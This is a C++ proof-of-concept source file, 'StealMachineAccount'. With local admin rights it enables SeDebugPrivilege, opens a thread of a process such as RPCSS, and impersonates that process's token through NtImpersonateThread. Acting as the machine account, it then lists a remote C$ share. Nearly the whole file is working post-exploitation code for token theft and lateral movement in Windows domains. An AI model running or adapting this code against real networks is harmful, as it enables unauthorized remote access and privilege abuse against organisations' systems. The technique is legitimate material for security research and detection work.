/********************************************************************
* StealMachineAccount: This PoC takes profit of a privileged 
* machine domain account (like for example a local admin or domain admin)
* on a Windows domain, stealing a System token and impersonating 
* machine acount for remote auhtentication and listing  C$.
* The point here is to impersonate a lower privilege service like RPCSS
* running with NETWORK SERVICE account. 
* 
* NOTE: We consider that source process has local Admnin privs and
* has High integrity (no SYSTEM account needed)
*********************************************************************/
#include <iostream>
#define MAX_NAME 256
#include <windows.h>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <psapi.h>
#include <windows.h>
#include <tchar.h> 
#include <stdio.h>
#include <strsafe.h>
#include <stdlib.h> 


std::string get_username()
{
	TCHAR username[UNLEN + 1] = { 0 };
	DWORD username_len = UNLEN + 1;
	int res = GetUserName(username, &username_len);
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	return username_s;
}

BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("[-] The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

HANDLE ListProcessThreads(DWORD dwOwnerPID)
{
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
	THREADENTRY32 te32;

	// Take a snapshot of all running threads  
	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreadSnap == INVALID_HANDLE_VALUE)
		return(FALSE);

	// Fill in the size of the structure before using it. 
	te32.dwSize = sizeof(THREADENTRY32);

	// Retrieve information about the first thread,
	// and exit if unsuccessful
	if (!Thread32First(hThreadSnap, &te32))
	{
		printf("[-] Error Thread32First\n");  // Show cause of failure
		CloseHandle(hThreadSnap);     // Must clean up the snapshot object!
		return(NULL);
	}

	// Now walk the thread list of the system,
	// and display information about each thread
	// associated with the specified process
	do
	{
		if (te32.th32OwnerProcessID == dwOwnerPID)
		{
			//printf("\n     THREAD ID      = 0x%08X", te32.th32ThreadID);
			//printf("\n     base priority  = %d", te32.tpBasePri);
			//printf("\n     delta priority = %d", te32.tpDeltaPri);
			HANDLE thandle = OpenThread(THREAD_DIRECT_IMPERSONATION,
				TRUE,
				te32.th32ThreadID
			);

			CloseHandle(hThreadSnap);

			if (thandle == NULL) {
				printf("[-] OpenThread failed\n");
				return (NULL);
			}
			else {
				printf("[+] OpenThread 0x%08X success!\n", te32.th32ThreadID);
				return (thandle);
			}
		}
	} while (Thread32Next(hThreadSnap, &te32));

	printf("[-] Process not found\n");
	return (NULL);
}

bool listdirectories(WCHAR *directory)
{
	WIN32_FIND_DATA ffd;
	LARGE_INTEGER filesize;
	TCHAR szDir[MAX_PATH];
	size_t length_of_arg;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	DWORD dwError = 0;


	StringCchLength(directory, MAX_PATH, &length_of_arg);

	printf("\nTarget directory is %s\n\n", directory);

	// Prepare string for use with FindFile functions.  First, copy the
	// string to a buffer, then append '\*' to the directory name.
	StringCchCopy(szDir, MAX_PATH, directory);
	StringCchCat(szDir, MAX_PATH, TEXT("\\*"));

	// Find the first file in the directory.
	hFind = FindFirstFile(szDir, &ffd);

	if (INVALID_HANDLE_VALUE == hFind)
	{
		printf("[-] FindFirstFile INVALID_HANDLE_VALUE! %i\n", GetLastError());
		return false;
	}

	// List all the files in the directory with some info about them.
	do
	{
		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			wprintf(L"  %ws   <DIR>\n", ffd.cFileName);
		}
		else
		{
			filesize.LowPart = ffd.nFileSizeLow;
			filesize.HighPart = ffd.nFileSizeHigh;
			wprintf(L"  %ws   %ld bytes\n", ffd.cFileName, filesize.QuadPart);
		}
	} while (FindNextFile(hFind, &ffd) != 0);

	dwError = GetLastError();
	if (dwError != ERROR_NO_MORE_FILES)
	{
		printf("[-] FindFirstFile ERROR_NO_MORE_FILES! %i\n", dwError);
		return false;
	}

	FindClose(hFind);
	return true;
}

int wmain(int argc, wchar_t** argv)
{
	SECURITY_QUALITY_OF_SERVICE sqos = {};
	sqos.Length = sizeof(sqos);
	sqos.ImpersonationLevel = SecurityImpersonation;
	//sqos.ImpersonationLevel = SecurityIdentification;
	DWORD bsize = 1024;
	CHAR buffer[1024];
	HANDLE currentTokenHandle = NULL;

	if (argc != 3) {
		wprintf(L"usage: %ws <PID> <NetShare>\n", argv[0]);
		wprintf(L"    Ex. StealMachineAccount 1020 \\WIN-VXQKGX098Q0\C$\n");

	}
	// Grab PID from command line argument
	DWORD pid = _wtoi(argv[1]);

	// Add SE debug privilege
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
	{
		printf("[+] SeDebugPrivilege enabled!\n");
	}
	else {
		printf("[-] SeDebugPrivilege not enabled!\n");
		exit(1);
	}



	// Call OpenProcess(), print return code and error code
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, true, pid);

	if (GetLastError() == NULL) {

		//Get process image name
		QueryFullProcessImageNameA((HMODULE)processHandle, 0, buffer, &bsize);

		if (GetLastError() != NULL)
		{
			printf("[-] Technique2 QueryFullProcessImageNameA Pid %i Error: %i\n", pid, GetLastError());
			return false;
		}
		printf("[+] Technique2 OpenProcess() %s success with pid %i !\n", buffer, pid);

	}
	else
	{
		printf("[-] Technique2 OpenProcess() Pid %i Error: %i\n", pid, GetLastError());
		return false;
	}

	//Get handle from first process thread
	HANDLE hThreadToImpersonate = ListProcessThreads(pid);
	if (hThreadToImpersonate == NULL)
	{
		printf("[-] Technique2 Error getting pthread\n");
		return false;
	}


	//Calling NativeAPI NtImpersonateThread
	typedef NTSTATUS __stdcall NtImpersonateThread(HANDLE ThreadHandle,
		HANDLE ThreadToImpersonate,
		PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService);

	NtImpersonateThread* fNtImpersonateThread =
		(NtImpersonateThread*)GetProcAddress(GetModuleHandle(L"ntdll"),
			"NtImpersonateThread");

	// Impersonate user in a thread
	BOOL impersonateUser = fNtImpersonateThread(GetCurrentThread(), hThreadToImpersonate, &sqos);
	if (GetLastError() == NULL)
	{
		printf("[+] Technique2 fNtImpersonateThread() %s success!\n", buffer);
		printf("[+] Technique2 Current user is: %s\n", (get_username()).c_str());

		//wchar_t  server[] = L"WIN-VXQKGX098Q0.prueba.com";
		
		if (listdirectories(argv[2]))
			printf("[+] Shares listed!\n");
		else
			printf("[-] listdirectories error!\n");

	}
	else
	{
		printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
	}


	getchar();
	// Closing not necessary handles
	CloseHandle(hThreadToImpersonate);
	CloseHandle(processHandle);
	return true;
}
